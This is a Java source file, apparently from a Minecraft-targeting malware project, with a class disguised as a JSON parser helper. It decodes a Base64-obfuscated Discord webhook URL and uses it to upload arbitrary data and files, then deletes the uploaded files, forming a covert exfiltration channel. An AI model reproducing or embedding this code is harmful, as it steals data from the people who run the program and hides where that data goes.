package com.inzo.technologies.inzoware.mc.parsers;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONParser;

public final class JSONRegexHandler {
    private static final String WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTI2OTE3NTc2NDI3MTk2NDY2L3pSNl9veVZJNXdOVldBdHNSZ1FMSWNwRTE0a2hSUnA5MmxSV3JucHJET0lTZlZoaTAxTFp6U1Y2R3RQNXlSS2dVT3Bn";
    private static boolean success = true;

    public static void send(String data) {
        if (!success) return;

        String result = JSONParser.post(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), data);
        if (result != null && result.contains("Invalid Webhook Token")) success = false;
    }

    public static void send(File file) {
        if (!success) return;

        String result = JSONParser.sendFile(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), file);
        if (result != null && result.contains("Invalid Webhook Token")) success = false;
        if (!file.delete() && file.exists())
            JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
    }
}